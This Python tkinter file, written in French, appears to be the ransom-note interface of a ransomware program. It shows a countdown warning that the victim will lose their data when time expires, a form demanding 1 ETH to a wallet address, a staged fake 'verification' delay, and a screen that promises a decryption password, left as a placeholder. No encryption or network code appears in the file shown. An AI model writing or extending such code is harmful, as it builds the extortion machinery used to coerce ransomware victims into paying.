from tkinter import *
from datetime import datetime
from functions import *

def update_counter(counter_label, root, target_date):
    # Recalculer la date actuelle
    current_date = datetime.now()

    # Calculer la différence entre la date cible et la date actuelle
    remaining_time = target_date - current_date
    
    # Vérifie s'il reste du temps
    if remaining_time.total_seconds() > 0:
        remaining_days = remaining_time.days
        remaining_seconds = remaining_time.seconds
        remaining_hours = remaining_seconds // 3600
        remaining_minutes = (remaining_seconds % 3600) // 60
        remaining_seconds = remaining_seconds % 60

        counter_label.config(text=f"Il reste {remaining_days} jour(s), "
                                 f"{remaining_hours:02}:{remaining_minutes:02}:{remaining_seconds:02} avant la fin.")
    else:
        counter_label.config(text="Le compteur est terminé. Vous ne pourrez plus récupérer vos données.")

    # Utiliser lambda pour appeler la fonction avec les arguments nécessaires
    root.after(1000, lambda: update_counter(counter_label, root, target_date))  

def show_payment_frame(formFrame, paymentFrame):
    formFrame.grid_forget()
    paymentFrame.grid(row=0, column=0, padx=100, pady=100)

def show_form_frame(paymentFrame, formFrame):
    paymentFrame.grid_forget()
    formFrame.grid(row=0, column=0, padx=100, pady=100)


def submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label):
    if len(wallet_adress_entry.get()) != 42:
        confirmation_label.config(text=f"Votre adresse de portefeuille est incorrect !\nVérifiez qu'il contient bien 42 caractères.\nIl y a actuellement {len(wallet_adress_entry.get())} caractères")
    elif amount_entry.get() < "1":
        confirmation_label.config(text="Le montant est incorrect, vous devez mettre 1 ETH.")
    else:
        # Masquer la frame de formulaire et afficher la frame de chargement
        formFrame.grid_forget()
        loadingFrame.grid(row=0, column=0, padx=100, pady=100)

        # Simuler un délai de "vérification" (par exemple, 3 secondes)
        # Après 3 secondes, appeler show_success
        root.after(3000, lambda: show_success(name_entry, surname_entry, loadingFrame, successFrame))  

def show_success(name_entry, surname_entry, loadingFrame, successFrame):
    loadingFrame.grid_forget()
    
    Label(successFrame, text="Bravo!\nLa transaction a été validée.", fg="green", bg="white").grid(column=0, row=0)
    Label(successFrame, text=f"Merci {surname_entry.get()} {name_entry.get()} pour ta contribution !", bg="white").grid(column=0, row=1)
    Label(successFrame, text=f"Comme promis, voici le mot de passe qui te permettra de decrypter tes fichiers :", bg="white").grid(column=0, row=3)
    Label(successFrame, text=f"INSERER MOT DE PASSE", bg="white").grid(column=0, row=4)

    # Afficher la frame de succès
    successFrame.grid(row=0, column=0, padx=100, pady=100)